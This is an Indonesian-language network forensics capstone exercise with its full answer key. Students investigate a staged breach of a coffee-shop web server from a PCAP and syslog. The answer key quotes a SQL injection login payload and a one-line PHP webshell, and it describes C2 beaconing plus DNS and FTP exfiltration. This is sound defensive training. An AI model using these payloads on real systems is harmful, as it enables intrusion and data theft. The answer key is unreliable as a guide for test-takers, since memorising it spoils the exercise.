#latihan 

Selamat, kamu sudah sampai di puncak modul Network Forensic. Capstone ini adalah **studi kasus besar** yang menggabungkan semua keterampilan: membaca PCAP, menganalisis DNS, HTTP, C2, exfiltration, membaca log, membangun timeline, dan menyusun laporan.

Kerjakan seperti investigasi sungguhan: pelan, teliti, dan selalu dukung setiap kesimpulan dengan evidence.

## Cerita kasus

**"Operasi Kopi Pahit"**

Kopi Senja Coffee Shop menjalankan server web `kopi-senja` (10.10.15.5) yang dipakai untuk website perusahaan dan panel admin. Pada pagi hari tanggal 12 Agustus 2026, administrator menemukan file aneh di folder upload dan menduga server telah disusupi. Tim incident response menangkap traffic jaringan dan mengambil log server sebelum server dimatikan.

Kamu ditunjuk sebagai forensic analyst. Evidence yang kamu terima:

```text
Files/capstone_operasi_kopi.pcap     traffic jaringan (satu file utuh)
Files/capstone_syslog.txt            /var/log/syslog server kopi-senja
```

Tidak ada fase yang dipisah-pisah seperti di Praktek 8. Semuanya ada dalam satu PCAP. Tugasmu menemukan dan membuktikan seluruh rangkaian serangan.

## Tujuan investigasi

1. Merekonstruksi urutan serangan dari awal sampai akhir.
2. Mengidentifikasi IP penyerang, metode exploit, webshell, server C2, dan metode exfiltration.
3. Menemukan flag yang disembunyikan di dalam evidence.
4. Menyusun laporan singkat dengan timeline dan IOC.

## Tahap 1: Kenali evidence

```bash
cd "Network Forensic/Files"
```

```bash
capinfos capstone_operasi_kopi.pcap
```

Catat: jumlah paket, durasi, waktu mulai dan selesai.

## Tahap 2: Peta besar traffic

```bash
tshark -r capstone_operasi_kopi.pcap -q -z conv,tcp
```

```bash
tshark -r capstone_operasi_kopi.pcap -q -z io,phs
```

Catat pasangan IP yang berbicara dan protokol yang muncul.

## Tahap 3: Telusuri fase demi fase

### Fase recon

```bash
tshark -r capstone_operasi_kopi.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0"
```

Cari port scan: port apa saja yang di-scan, mana yang terbuka (balasan SYN, ACK), mana yang tertutup (balasan RST). Cocokkan dengan baris SSH brute force di syslog.

### Fase exploit

```bash
tshark -r capstone_operasi_kopi.pcap -Y "http.request.method == POST" -T fields -e tcp.payload | xxd -r -p
```

Baca payload POST. Ada SQL injection di login, lalu upload file. Ekstrak nama file upload dan isi filenya.

```bash
tshark -r capstone_operasi_kopi.pcap -Y "http.request.uri contains upload" -T fields -e tcp.payload | xxd -r -p
```

### Fase webshell

```bash
tshark -r capstone_operasi_kopi.pcap -Y "http.request.uri contains foto_profil" -T fields -e http.request.uri
```

Ikuti stream webshell untuk membaca perintah yang dieksekusi dan outputnya. Cocokkan dengan baris apache di syslog.

### Fase C2

```bash
tshark -r capstone_operasi_kopi.pcap -Y "ip.addr == 203.0.113.66" -T fields -e frame.time_relative -e http.request.uri
```

Tentukan interval beacon. Decode parameter `z`:

```bash
echo "YmVhY29uOjA=" | base64 -d
```

### Fase exfiltration

```bash
tshark -r capstone_operasi_kopi.pcap -Y "dns.qry.name contains exfil && dns.flags.response == 0" -T fields -e dns.qry.name | sed 's/\..*//' | tr -d '\n' | xxd -r -p
```

Decode hex subdomain untuk mendapatkan flag. Lalu periksa sesi FTP:

```bash
tshark -r capstone_operasi_kopi.pcap -Y "ftp.request" -T fields -e ftp.request.command -e ftp.request.arg
```

## Pertanyaan investigasi

Jawab semua pertanyaan berikut dengan evidence.

### Identitas dan recon

1. Apa hostname dan IP server korban?
2. Siapa IP penyerang saat fase recon dan exploit?
3. Port apa saja yang terbuka hasil scan? Sebutkan service yang berjalan di tiap port tersebut.

### Exploit

4. Tulis payload SQL injection yang dipakai untuk login.
5. Apa nama webshell yang di-upload dan ke path mana?
6. Command pertama yang dieksekusi lewat webshell dan outputnya?
7. Sebagai user apa webshell berjalan (lihat output command yang relevan)?

### C2

8. Apa IP, port, dan domain server C2?
9. Berapa interval beacon-nya?
10. Parameter `z` pada beacon berisi apa setelah di-decode?

### Exfiltration

11. Metode apa saja yang dipakai untuk mengirim data keluar?
12. Tulis flag yang ditemukan di query DNS.
13. Akun FTP apa yang dipakai dan file apa yang diambil?

### Timeline dan laporan

14. Susun kronologi lengkap serangan (waktu + kejadian + evidence pendukung), dari awal sampai akhir.
15. Tulis IOC yang bisa dibagikan: IP, domain, port, interval, nama file, akun.

## Format laporan yang diminta

```text
1. Ringkasan eksekutif (maksimal 3 kalimat)
2. Kronologi (tabel waktu + kejadian + evidence)
3. Detail per fase (recon, exploit, C2, exfil)
4. IOC
5. Flag
```

## Pembahasan (baca setelah selesai mencoba)

Halaman berikut berisi jawaban lengkap. Kerjakan dulu semuanya, lalu bandingkan. Jangan menyerah sebelum benar-benar mencoba semua langkah.

---

# KUNCI JAWABAN CAPSTONE

## Jawaban singkat

1. Hostname `kopi-senja`, IP `10.10.15.5`.
2. IP penyerang fase recon/exploit: `10.10.14.2`.
3. Port terbuka: `22` (SSH), `80` (HTTP), `8080` (HTTP-alt, dipakai C2). Port 21, 443, 3306 tertutup.
4. `username=admin' OR '1'='1' -- &password=apa_saja` (SQL injection pada login admin).
5. Webshell: `foto_profil.php`, di-upload ke `/admin/upload_foto.php`, tersimpan di `/uploads/foto_profil.php`, isinya `<?php system($_GET["cmd"]); ?>`.
6. Command pertama `id`, output `uid=33(www-data) gid=33(www-data)`.
7. Berjalan sebagai user `www-data`.
8. C2: IP `203.0.113.66`, port `8080`, domain `c2.kopi-senja-bot.net`.
9. Interval beacon 7 detik.
10. `YmVhY29uOjA=` di-decode menjadi `beacon:0` (status beacon).
11. Dua metode: DNS exfiltration (data di subdomain) dan FTP (mengambil `customer_db.zip`).
12. Flag: `flag{k0p1_p4h1t_c2_d4n_3xf1l_b3rh4s1l}`
13. Akun FTP `backup` dengan password `backup123`, mengambil `/backup/customer_db.zip`.

## Kronologi

```text
15:00:00  (PCAP) server mulai, DHCP dan NTP
15:00:52  (PCAP+syslog) SYN scan port 21-8080 dari 10.10.14.2, SSH brute force terdeteksi di syslog
15:02:10  (PCAP+syslog) POST /admin/login.php dengan SQLi, login admin berhasil
15:02:15  (PCAP+syslog) POST /admin/upload_foto.php, upload foto_profil.php
15:02:21  (PCAP+syslog) GET /uploads/foto_profil.php?cmd=id, output www-data
15:02:30  (PCAP+syslog) eksekusi uname, cat /etc/passwd, whoami
15:04:34  (PCAP+syslog) beacon C2 pertama ke c2.kopi-senja-bot.net (203.0.113.66:8080), interval 7 detik
15:06:59  (PCAP) query DNS exfil ke exfil.kopi-senja-bot.net, data hex di subdomain
15:07:01  (PCAP+syslog) login FTP backup@203.0.113.66, download customer_db.zip
15:07:13  (PCAP+syslog) QUIT, sesi berakhir
```

## Bagaimana jawaban ditemukan

1. **Scan**: filter `tcp.flags.syn == 1 && tcp.flags.ack == 0` menampilkan SYN ke 6 port. Port 22, 80, 8080 membalas SYN, ACK (terbuka), sisanya RST.
2. **SQLi**: payload POST dibaca via `tshark ... -e tcp.payload | xxd -r -p`. Syarat `' OR '1'='1' --` membuat query login selalu benar.
3. **Webshell**: response upload menyebut `/uploads/foto_profil.php`, dan isi file (payload multipart) adalah `<?php system($_GET["cmd"]); ?>`.
4. **C2**: percakapan `10.10.15.5 → 203.0.113.66:8080` dengan URI `/gate.php?z=...` berulang setiap 7 detik. Host header `c2.kopi-senja-bot.net`. Parameter base64 di-decode menjadi `beacon:0`.
5. **Exfil DNS**: subdomain `exfil.kopi-senja-bot.net` berisi label hex yang digabung dan di-decode menjadi flag.
6. **FTP**: perintah `USER backup`, `PASS backup123`, `RETR /backup/customer_db.zip`, `226 transfer complete`, `QUIT`. Syslog mengonfirmasi download 2.457.600 byte.

## IOC

```text
IP attacker     : 10.10.14.2
IP korban       : 10.10.15.5
C2 IP           : 203.0.113.66
C2 domain       : c2.kopi-senja-bot.net
Exfil domain    : exfil.kopi-senja-bot.net
Port            : 80, 8080, 21
Interval beacon : 7 detik
Webshell        : foto_profil.php
Akun exfil      : backup / backup123
File exfil      : customer_db.zip
```

## Penutup

Kasus ini meniru pola serangan nyata: recon → exploit → webshell → C2 → exfiltrasi. Setiap fase meninggalkan jejak yang bisa dibaca jika kamu tahu di mana mencarinya dan bagaimana menghubungkannya. Keterampilan ini bukan hanya untuk lomba, tetapi juga untuk dunia kerja sebagai forensic analyst atau incident responder.

Langkah berikutnya yang bisa kamu pelajari: memory forensics (melihat proses C2 di RAM), Windows forensics (Prefetch, registry, event log), dan browser forensics (history dan cache). Semua itu saling melengkapi network forensic yang baru saja kamu kuasai.
